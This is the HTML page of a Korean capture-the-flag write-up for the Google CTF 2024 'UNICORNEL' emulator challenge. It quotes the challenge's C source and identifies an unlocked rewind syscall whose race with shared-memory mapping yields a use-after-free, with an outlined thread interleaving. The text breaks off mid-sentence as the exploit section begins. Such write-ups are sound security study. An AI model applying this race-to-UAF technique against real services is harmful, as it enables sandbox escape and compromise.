<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Google CTF 2024 - UNICORNEL | msh1307</title>
<meta name="keywords" content="Unicornel, JIT Exploit">
<meta name="description" content="UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.
Analysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be &lt;code length&gt; bytes of assembled machine code in the specified instruction set architecture.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/google_ctf_2024_unicornel/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Google CTF 2024 - UNICORNEL" />
<meta property="og:description" content="UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.
Analysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be &lt;code length&gt; bytes of assembled machine code in the specified instruction set architecture." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/google_ctf_2024_unicornel/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-06-25T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-06-25T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Google CTF 2024 - UNICORNEL"/>
<meta name="twitter:description" content="UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.
Analysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be &lt;code length&gt; bytes of assembled machine code in the specified instruction set architecture."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Google CTF 2024 - UNICORNEL",
      "item": "https://msh1307.kr/blog/google_ctf_2024_unicornel/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Google CTF 2024 - UNICORNEL",
  "name": "Google CTF 2024 - UNICORNEL",
  "description": "UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.\nAnalysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be \u0026lt;code length\u0026gt; bytes of assembled machine code in the specified instruction set architecture.",
  "keywords": [
    "Unicornel", "JIT Exploit"
  ],
  "articleBody": "UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.\nAnalysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be bytes of assembled machine code in the specified instruction set architecture. NOTE: Any feedback about the unicornelf format should be submitted to: https://docs.google.com/forms/d/e/1FAIpQLSck2N2w5J84iu7CKYlGkEmwn1Xsjtl5Jmlm_4t2DfC8vwNLOw/viewform?usp=sharing\u0026resourcekey=0--aU-tRVYI9eI9UCRMuEMfQ There MUST be at least one mapping specified - the first mapping ALWAYS stores the uploaded machine code. Any unused maps array elements can be set to whatever values you want, and unicornelf will dutifully ignore them. After receiving the unicornelf and bytes of machine code, the \"process\" will be automatically started on a new POSIX thread. The lowest available pid is assigned to the process. Bear in mind that this pid is utterly unrelated to the actual Linux tid of the thread. ==== Process Limitations ==== There can only be up to 8 processes at a time. There can only be one process per architecture at a time. (e.g. you cannot have two x86 processes) ==== Process lifetime ==== Processes execute until one of the following conditions: - The exit syscall is called by the process - The process executes the last instruction in the uploaded assembly code - The process encounters some exception condition - The client connection to the Unicornel is terminated (all processes unceremoniously terminate) ==== System Call conventions ==== The system call interface is invoked whenever an interrupt is generated by the uploaded and executing machine code. System call arguments are passed in on all architectures via registers. The system call number is always arg0 (e.g. rax on x86). The remaining 3 arguments are used to pass whatever data is needed to the syscall. The register to arguments mappings for all architectures is defined by the call_regs array. Each element index of the inner per-architecture array element corresponds to the given argument index: static unsigned int call_regs[UC_ARCH_MAX][4] = { {0,0,0,0}, //NONE {UC_ARM_REG_R0,UC_ARM_REG_R1,UC_ARM_REG_R2,UC_ARM_REG_R3}, //UC_ARCH_ARM {UC_ARM64_REG_X0,UC_ARM64_REG_X1,UC_ARM64_REG_X2,UC_ARM64_REG_X3}, //UC_ARCH_ARM64 {UC_MIPS_REG_A0,UC_MIPS_REG_A1,UC_MIPS_REG_A2,UC_MIPS_REG_A3}, //UC_ARCH_MIPS {UC_X86_REG_RAX,UC_X86_REG_RBX,UC_X86_REG_RCX,UC_X86_REG_RDX}, //UC_ARCH_X86 {UC_PPC_REG_0,UC_PPC_REG_1,UC_PPC_REG_2,UC_PPC_REG_3}, //UC_ARCH_PPC {UC_SPARC_REG_O0,UC_SPARC_REG_O1,UC_SPARC_REG_O2,UC_SPARC_REG_O3}, //UC_ARCH_SPARC {UC_M68K_REG_D0,UC_M68K_REG_D1,UC_M68K_REG_D2,UC_M68K_REG_D3}, //UC_ARCH_M68K {UC_RISCV_REG_A0,UC_RISCV_REG_A1,UC_RISCV_REG_A2,UC_RISCV_REG_A3}, //UC_ARCH_RISCV {UC_S390X_REG_R0,UC_S390X_REG_R1,UC_S390X_REG_R2,UC_S390X_REG_R3}, //UC_ARCH_S390X {UC_TRICORE_REG_D0,UC_TRICORE_REG_D1,UC_TRICORE_REG_D2,UC_TRICORE_REG_D3}, //UC_ARCH_TRICORE }; E.g. for an X86 process to call unicornel_write, you would set rax to 1 (the unicornel write syscall number), rbx to the location of the buffer to write, and rcx to the number of bytes to write. ==== Supported system calls ==== There are 11 supported system calls: Syscall Name # unicornel_exit 0 unicornel_write 1 print_integer 2 create_shared 3 map_shared 4 unmap_shared 5 bookmark 6 unicornel_rewind 7 switch_arch 8 unicornel_pause 9 unicornel_resume 10 void unicornel_exit(); Terminates the calling process This function never returns long unicornel_write(void* buf, size_t count); Write up to count bytes from the buffer at buf to the unicornel client (eventually sent over the socket). Returns the number of bytes written, or an error code if there was a failure. void-ish print_integer(long integer); Write the argument as an ASCII base-10 integer to the unicornel client. Always returns 0. long create_shared(unsigned long length); Creates a new shared memory buffer of the specified length Returns a handle to the buffer to be used with map_shared later, or an error code. long map_shared(void* addr,unsigned long length, unsigned long handle); Map a shared buffer previously created with create_shared at the address addr. Lengths less than the size of the shared buffer are ok. Returns 0 on success, or an error code. NOTE: A process can only have one shared buffer mapped at a time, but multiple processes can map the same shared buffer at the same time. long unmap_shared(); Unmaps a previously mapped shared buffer Returns 0 on success or an error code WARNING: If this was the last mapping of the shared buffer, the shared buffer will be destroyed and the handle released to be used for new created shared buffers long bookmark(); Bookmark the current processor state to return to later with rewind(). Returns 0 on success or an error code. NOTE: You can only have one bookmark at a time. Once a bookmark is created, it cannot be destroyed or reset except by switching architectures. You can rewind to the same bookmark multiple times. long unicornel_rewind(); Rewind the processor to the state previously saved by bookmark(). Returns 0 on success or an error code. NOTE: This does not rewind writes to memory, but will rewind (and unmap) shared buffers that were mapped since the bookmark'd processor state. WARNING: While shared buffer mappings can be rewound, shared buffer *unmappings* cannot be in order to avoid potential UAF issues. This feature may be added in future versions.... void switch_arch(uc_arch arch, uc_mode mode, void* new_pc); Switch the instruction set architecture used by this process, and long jump to new_pc Mappings (including shared mappings) and memory contents are preserved across the switch. CPU State (including registers and bookmarks) are discarded. Ensure any desired state to pass across the ISA barrier is saved to memory beforehand. This system call does not (really) \"return\", and no return value is specified. NOTE: In order to prevent the numerous developer headaches that would otherwise result, a process can only transition architectures once in its lifetime. WARNING: Any shared buffer mappings have an additional refcount \"zombified\". This additional reference will be destroyed when the process exits. This means that a shared buffer may not be mapped anywhere, and yet still exist and be mappable. This is not considered a bug, but it's not really a feature either. void-ish unicornel_pause(); Pause the current process until another process calls unicornel_resume() with the appropriate pid This system call always succeeds, and always returns 0. long unicornel_resume(unsigned long pid) Resume the process specified by pid. Returns 0 on success, or an error code. 처음에 Docs가 주어진다. 멀티 아키텍처, 멀티 프로세스 에뮬레이터가 주어진다. 각자의 프로세스는 병렬적으로 동작하며, IPC를 위한 shared memory가 최대 하나가 매핑될 수 있었다. 소스코드도 전체가 주어져서 분석 자체는 되게 쉽게 할 수 있었다.\nint main(int argc, char *argv[]) { pfds[MAX_PROCESSES].fd = 0 /* stdin */; pfds[MAX_PROCESSES].events = POLLIN; pfds[MAX_PROCESSES].revents = 0; for(unsigned int i = 0; i \u003c MAX_PROCESSES; i++) { pfds[i].fd = -1; pfds[i].events = POLLIN; pfds[i].revents = 0; } printf(\"Welcome to the unicornel!\\n\"); fflush(stdout); pthread_mutex_init(\u0026task_lock,NULL); while(1) { poll(pfds,MAX_PROCESSES + 1,-1); for(unsigned i = 0; i \u003c MAX_PROCESSES; i++) { //Data available from emulated process if(pfds[i].revents \u0026 POLLIN) { int nbytes; ioctl(pfds[i].fd,FIONREAD,\u0026nbytes); splice(pfds[i].fd,0,1 /* stdout */,0,nbytes,0); } //Process ended, and the write end of the pipe was closed in destroy_process. Finish cleanup if(pfds[i].revents \u0026 POLLHUP) { close(pfds[i].fd); pfds[i].fd = -1; } } if(pfds[MAX_PROCESSES].revents \u0026 POLLIN) { //Received new process data start_process(); fflush(stdout); } } return 0; } 단순히 커스텀 ELF 포맷을 받아서 실행해준다.\nint start_process() { pthread_mutex_lock(\u0026task_lock); int pid = find_free_process(); if(pid \u003c 0) { printf(\"At max processes already\\n\"); pthread_mutex_unlock(\u0026task_lock); return -1; } struct unicornelf process_data; //Signal to client that we're ready to receive process_data printf(\"DATA_START\\n\"); int ret = read(0,\u0026process_data,sizeof(process_data)); if(ret != sizeof(process_data)) { printf(\"Unexpected read size\\n\"); pthread_mutex_unlock(\u0026task_lock); return -1; } if(!process_data.code_length || !process_data.num_maps || process_data.num_maps \u003e 4 || process_data.code_length \u003e process_data.maps[0].length) { printf(\"Malformed process data\\n\"); pthread_mutex_unlock(\u0026task_lock); return -1; } //Only allow one process per architecture if(process_data.arch \u003e= UC_ARCH_MAX || process_data.arch \u003c 1 || arch_used[process_data.arch]) { printf(\"Invalid arch specified\\n\"); pthread_mutex_unlock(\u0026task_lock); return -1; } char* code_recv = calloc(1,process_data.code_length); //Signal to client that we're ready to receive process code printf(\"CODE_START\\n\"); fflush(stdout); read(0,code_recv,process_data.code_length); uc_engine *uc; uc_err err; err = uc_open(process_data.arch,process_data.mode,\u0026uc); if(err != UC_ERR_OK) { printf(\"Failed on uc_open() %u %u with error %u\\n\",process_data.arch,process_data.mode,err); pthread_mutex_unlock(\u0026task_lock); free(code_recv); return -1; } for(unsigned i = 0; i \u003c process_data.num_maps; i++) { err = uc_mem_map(uc,process_data.maps[i].va,process_data.maps[i].length,UC_PROT_ALL); if(err != UC_ERR_OK) { printf(\"Failed on uc_mem_map() with error %u\\n\",err); free(code_recv); uc_close(uc); pthread_mutex_unlock(\u0026task_lock); return -1; } } err = uc_mem_write(uc,process_data.maps[0].va,code_recv,process_data.code_length); free(code_recv); if(err != UC_ERR_OK) { printf(\"failed on uc_mem_write() with error %u\\n\",err); uc_close(uc); pthread_mutex_unlock(\u0026task_lock); return -1; } uc_hook trace; int pipefds[2]; pipe(pipefds); pfds[pid].fd = pipefds[0]; pfds[pid].events = POLLIN; pfds[pid].revents = 0; struct process* new_process = calloc(1,sizeof(struct process)); new_process-\u003epid = pid; new_process-\u003eoutfd = pipefds[1]; new_process-\u003euc = uc; new_process-\u003earch = process_data.arch; new_process-\u003eentrypoint = process_data.maps[0].va; new_process-\u003ecode_length = process_data.code_length; new_process-\u003ebookmark = NULL; new_process-\u003esbr.va = 0; new_process-\u003esbr.unmap_on_rewind = false; new_process-\u003etransition = false; memcpy(new_process-\u003emaps,process_data.maps,sizeof(process_data.maps)); new_process-\u003enum_maps = process_data.num_maps; processes[pid] = new_process; err = uc_hook_add(uc,\u0026trace,UC_HOOK_INTR,hook_call,new_process,1,0); if(err != UC_ERR_OK) { printf(\"failed on uc_hook_add() with error %u\\n\",err); destroy_process(new_process); pthread_mutex_unlock(\u0026task_lock); return -1; } pthread_attr_t attr; pthread_attr_init(\u0026attr); pthread_attr_setdetachstate(\u0026attr, PTHREAD_CREATE_DETACHED); int pthread_err = pthread_create(\u0026new_process-\u003ethread,\u0026attr,process_thread,new_process); if(pthread_err != 0) { printf(\"failed to create pthread\\n\"); destroy_process(new_process); } else { printf(\"new process created with pid %d\\n\",pid); arch_used[process_data.arch] = true; } pthread_mutex_unlock(\u0026task_lock); return pthread_err; } 여기서 쓰레드로 병렬적으로 실행해준다.\nstruct unicornelf { uc_arch arch; uc_mode mode; struct { unsigned long va; unsigned long length; } maps[4]; unsigned short code_length; unsigned char num_maps; }; struct buffer_ref { unsigned long va; unsigned long length; unsigned handle; bool unmap_on_rewind; }; struct process { pthread_t thread; uc_arch arch; int outfd; uc_engine *uc; unsigned long entrypoint; uc_context* bookmark; struct buffer_ref sbr; struct { unsigned long va; unsigned long length; } maps[4]; unsigned short code_length; unsigned char pid; unsigned char num_maps; bool transition; bool paused; }; struct shared_buffer { volatile atomic_uint refs; void* buffer; unsigned length; }; static unsigned int call_regs[UC_ARCH_MAX][4] = { {0,0,0,0}, //NONE {UC_ARM_REG_R0,UC_ARM_REG_R1,UC_ARM_REG_R2,UC_ARM_REG_R3}, //UC_ARCH_ARM {UC_ARM64_REG_X0,UC_ARM64_REG_X1,UC_ARM64_REG_X2,UC_ARM64_REG_X3}, //UC_ARCH_ARM64 {UC_MIPS_REG_A0,UC_MIPS_REG_A1,UC_MIPS_REG_A2,UC_MIPS_REG_A3}, //UC_ARCH_MIPS {UC_X86_REG_RAX,UC_X86_REG_RBX,UC_X86_REG_RCX,UC_X86_REG_RDX}, //UC_ARCH_X86 {UC_PPC_REG_0,UC_PPC_REG_1,UC_PPC_REG_2,UC_PPC_REG_3}, //UC_ARCH_PPC {UC_SPARC_REG_O0,UC_SPARC_REG_O1,UC_SPARC_REG_O2,UC_SPARC_REG_O3}, //UC_ARCH_SPARC {UC_M68K_REG_D0,UC_M68K_REG_D1,UC_M68K_REG_D2,UC_M68K_REG_D3}, //UC_ARCH_M68K {UC_RISCV_REG_A0,UC_RISCV_REG_A1,UC_RISCV_REG_A2,UC_RISCV_REG_A3}, //UC_ARCH_RISCV {UC_S390X_REG_R0,UC_S390X_REG_R1,UC_S390X_REG_R2,UC_S390X_REG_R3}, //UC_ARCH_S390X {UC_TRICORE_REG_D0,UC_TRICORE_REG_D1,UC_TRICORE_REG_D2,UC_TRICORE_REG_D3}, //UC_ARCH_TRICORE }; static unsigned int ip_reg[UC_ARCH_MAX] = { 0, UC_ARM_REG_PC, UC_ARM64_REG_PC, UC_MIPS_REG_PC, UC_X86_REG_RIP, UC_PPC_REG_PC, UC_SPARC_REG_PC, UC_M68K_REG_PC, UC_RISCV_REG_PC, UC_S390X_REG_PC, UC_TRICORE_REG_PC }; 여러 아키텍처들을 지원한다. 핵심 데이터 구조는 위와 같이 되어있다.\nlong (*syscalls[])(struct process* current) = { unicornel_exit, unicornel_write, print_integer, create_shared, map_shared, unmap_shared, bookmark, unicornel_rewind, switch_arch, unicornel_pause, unicornel_resume }; 시스템콜도 몇개 구현되어있지 않다. syscalls.c에 시스템콜들이 모두 구현되어있다.\nlong unicornel_pause(struct process* current) { current-\u003epaused = true; while(current-\u003epaused); return 0; } long unicornel_resume(struct process* current) { unsigned long pid = ARG_REGR(current,1); pthread_mutex_lock(\u0026task_lock); if(pid \u003e MAX_PROCESSES || !processes[pid] || !processes[pid]-\u003epaused) { pthread_mutex_unlock(\u0026task_lock); return -1; } processes[pid]-\u003epaused = false; pthread_mutex_unlock(\u0026task_lock); return 0; } resume \u0026 pause는 다른 프로세스를 멈추고 깨우는 시스템콜이다.\nlong switch_arch(struct process* current) { //Only allow switching architectures once in order to avoid potential recursion stack overflows if(current-\u003etransition) return -1; uc_arch arch = ARG_REGR(current,1); uc_mode mode = ARG_REGR(current,2); unsigned long new_pc = ARG_REGR(current,3); if(!uc_arch_supported(arch) || arch_used[arch]) { return -2; } uc_engine* new_uc; uc_engine* og_uc = current-\u003euc; uc_arch og_arch = current-\u003earch; struct buffer_ref og_sbr = current-\u003esbr; uc_err e = uc_open(arch,mode,\u0026new_uc); if(e != UC_ERR_OK) { return -3; } //Add in the hook so syscalls are supported uc_hook trace; e = uc_hook_add(new_uc,\u0026trace,UC_HOOK_INTR,hook_call,current,1,0); if(e != UC_ERR_OK) { uc_close(new_uc); return -5; } //Transition maps for(unsigned i = 0; i \u003c current-\u003enum_maps; i++) { e = uc_mem_map(new_uc,current-\u003emaps[i].va,current-\u003emaps[i].length,UC_PROT_ALL); if(e != UC_ERR_OK) { uc_close(new_uc); return -4; } //Transition the memory across to the new uc char* transition_buffer = malloc(current-\u003emaps[i].length); if(!transition_buffer) { uc_close(new_uc); return -4; } uc_mem_read(current-\u003euc,current-\u003emaps[i].va,transition_buffer,current-\u003emaps[i].length); uc_mem_write(new_uc,current-\u003emaps[i].va,transition_buffer,current-\u003emaps[i].length); free(transition_buffer); } //Including shared regions if(og_sbr.va) { uc_mem_map_ptr(new_uc,og_sbr.va,og_sbr.length,UC_PROT_ALL,shared_buffers[og_sbr.handle].buffer); //Transitioning architectures means there's now two references to the shared buffer - the original arch ref and the new arch ref shared_buffers[og_sbr.handle].refs++; current-\u003esbr.unmap_on_rewind = false; } //Destroy bookmark, because we can't rewind through architectures anyway uc_context_free(current-\u003ebookmark); current-\u003ebookmark = NULL; //Complete transition current-\u003euc = new_uc; current-\u003earch = arch; arch_used[arch] = true; arch_used[og_arch] = false; current-\u003etransition = true; uc_emu_start(new_uc,new_pc,0,0,0); //Detransition, destorying the new state and restoring the old state so destroy_process can clean up current-\u003euc = og_uc; pthread_mutex_lock(\u0026task_lock); if(current-\u003esbr.va) { shared_buffers[current-\u003esbr.handle].refs--; if(shared_buffers[current-\u003esbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u003esbr.handle].buffer); shared_buffers[current-\u003esbr.handle].refs--; } } //Restore sbr, only for it to be freed in destroy_process current-\u003esbr = og_sbr; arch_used[arch] = false; pthread_mutex_unlock(\u0026task_lock); uc_close(new_uc); uc_emu_stop(og_uc); return 0; } 런타임에 아키텍처의 변경을 지원한다.\nlong bookmark(struct process* current) { if(current-\u003ebookmark) { return -1; } uc_err e = uc_context_alloc(current-\u003euc,\u0026current-\u003ebookmark); if(e == UC_ERR_OK) e = uc_context_save(current-\u003euc,current-\u003ebookmark); return e; } long unicornel_rewind(struct process* current) { if(current-\u003ebookmark == NULL) { return -1; } uc_err e = uc_context_restore(current-\u003euc,current-\u003ebookmark); if(e != UC_ERR_OK) { //Couldn't rewind so just fail out return -2; } /* If we bookmarked, then mapped a shared buffer, we need to unmap the shared buffer to * restore the original state properly. * We can skip a full unmap_shared call because we do the checking here directly. */ if(current-\u003esbr.va \u0026\u0026 current-\u003esbr.unmap_on_rewind) { uc_err e = uc_mem_unmap(current-\u003euc,current-\u003esbr.va,current-\u003esbr.length); if(e == UC_ERR_OK) { shared_buffers[current-\u003esbr.handle].refs--; } current-\u003esbr.va = 0; current-\u003esbr.unmap_on_rewind = false; if(shared_buffers[current-\u003esbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u003esbr.handle].buffer); shared_buffers[current-\u003esbr.handle].refs--; } } return 0; } bookmark \u0026 rewind는 현재 context를 저장하고, 이를 다시 복원하는 시스템콜이다.\nstruct shared_buffer shared_buffers[MAX_PROCESSES] = { 0 }; long create_shared(struct process* current) { pthread_mutex_lock(\u0026task_lock); unsigned long length = ARG_REGR(current,1); if(length \u003e 0x10000 || !length || length \u0026 0xFFF) { pthread_mutex_unlock(\u0026task_lock); return -1; } //Find an empty shared buffer handle unsigned long handle; for(handle = 0; handle \u003c MAX_PROCESSES; handle++) { if(!shared_buffers[handle].refs) break; } if(handle == MAX_PROCESSES) { pthread_mutex_unlock(\u0026task_lock); return -2; } void* buffer = calloc(1,length); if(!buffer) { pthread_mutex_unlock(\u0026task_lock); return -3; } shared_buffers[handle].refs = 1; //Set to 1 to give a chance to map it shared_buffers[handle].buffer = buffer; shared_buffers[handle].length = length; pthread_mutex_unlock(\u0026task_lock); return handle; } long map_shared(struct process* current) { if(current-\u003esbr.va) { return -1; } pthread_mutex_lock(\u0026task_lock); unsigned long handle = ARG_REGR(current,3); if(handle \u003e= MAX_PROCESSES || !shared_buffers[handle].refs) { pthread_mutex_unlock(\u0026task_lock); return -2; } unsigned long length = ARG_REGR(current,2); if(!length || length \u0026 0xFFF || length \u003e shared_buffers[handle].length) { pthread_mutex_unlock(\u0026task_lock); return -3; } unsigned long addr = ARG_REGR(current,1); if(!addr|| addr \u0026 0xFFF) { pthread_mutex_unlock(\u0026task_lock); return -4; } uc_err e = uc_mem_map_ptr(current-\u003euc,addr, length,UC_PROT_ALL,shared_buffers[handle].buffer); if(e == UC_ERR_OK) { shared_buffers[handle].refs++; current-\u003esbr.handle = handle; current-\u003esbr.length = length; current-\u003esbr.va = addr; if(current-\u003ebookmark) { //We need to unmap the shared mapping on rewind if we bookmarked previously current-\u003esbr.unmap_on_rewind = true; } } pthread_mutex_unlock(\u0026task_lock); return e; } //The bottom reference is only ever released by destroy_shared. Any maps will increase refcount to \u003e 1 long unmap_shared(struct process* current) { if(!current-\u003esbr.va) { return -1; } pthread_mutex_lock(\u0026task_lock); uc_err e = uc_mem_unmap(current-\u003euc,current-\u003esbr.va,current-\u003esbr.length); if(e == UC_ERR_OK) { shared_buffers[current-\u003esbr.handle].refs--; current-\u003esbr.va = 0; current-\u003esbr.unmap_on_rewind = false; } if(shared_buffers[current-\u003esbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u003esbr.handle].buffer); shared_buffers[current-\u003esbr.handle].refs--; } pthread_mutex_unlock(\u0026task_lock); return e; } shared memory create \u0026 mapping \u0026 unmapping을 지원하는 시스템 콜들도 구현되어있다. 나머지는 단순 write 시스템콜이나 아웃풋 출력 관련 시스템콜들이다.\nVulnerability long unicornel_rewind(struct process* current) { if(current-\u003ebookmark == NULL) { return -1; } uc_err e = uc_context_restore(current-\u003euc,current-\u003ebookmark); if(e != UC_ERR_OK) { //Couldn't rewind so just fail out return -2; } /* If we bookmarked, then mapped a shared buffer, we need to unmap the shared buffer to * restore the original state properly. * We can skip a full unmap_shared call because we do the checking here directly. */ if(current-\u003esbr.va \u0026\u0026 current-\u003esbr.unmap_on_rewind) { uc_err e = uc_mem_unmap(current-\u003euc,current-\u003esbr.va,current-\u003esbr.length); if(e == UC_ERR_OK) { shared_buffers[current-\u003esbr.handle].refs--; } current-\u003esbr.va = 0; current-\u003esbr.unmap_on_rewind = false; if(shared_buffers[current-\u003esbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u003esbr.handle].buffer); shared_buffers[current-\u003esbr.handle].refs--; } } return 0; } rewind에서 lock이 구현되지 않아서 map \u0026 unmap 등에서 공유 자원 접근에 lock이 걸려있어도 race가 발생하며 특정 케이스에서는 메모리 취약점까지 연계될 수 있다.\nExploit race를 악용하기 위해서 생각했던 방식은 rewind syscall과 map을 겹쳐 race를 일으키는 방식이였다. 성공하면 UAF를 얻게 된다.\npid 0 : save ctx -\u003e pause -\u003e map shared -\u003e resume 1 -\u003e rewind pid 1 : create shared -\u003e resume 0 -\u003e pause -\u003e map shared 실질적으로 저렇게 pause 하고 프로세스 실행시키면 rewind와 map shared를 최대한 겹칠 수 있다. rewind 이전에 shared memory가 매핑되어야 rewind시에 flag가 세팅되고 unmap이 내부적으로 발생한다. flag가 세팅되었다고 가정하고 다음과 같은 내부 동작으로 간단하게 표현할 수 있다.\n[MAP] 1) if refs != 0 -\u003e cont 2) refs += 1 3) map_internal() [REWIND] 1) refs -= 1 2) if refs == 1 -\u003e cont 3) free mem 4) refs -= 1 pid 0 : map -\u003e ref count = 2 pid 0 : rewind - (1) -\u003e ref count = 1 pid 0 : rewind - (3) -\u003e memory free pid 1 : map - (1) -\u003e ref count = 1, condition bypassed 위 순서가 지켜지면 이 이후의 ref count가 어떻게 연산되던간에 변경되더라도 메모리 버그로 연계된다. 위 시나리오로 코드를 작성해서 성공적으로 race가 발생하면 해당 쓰레드 힙의 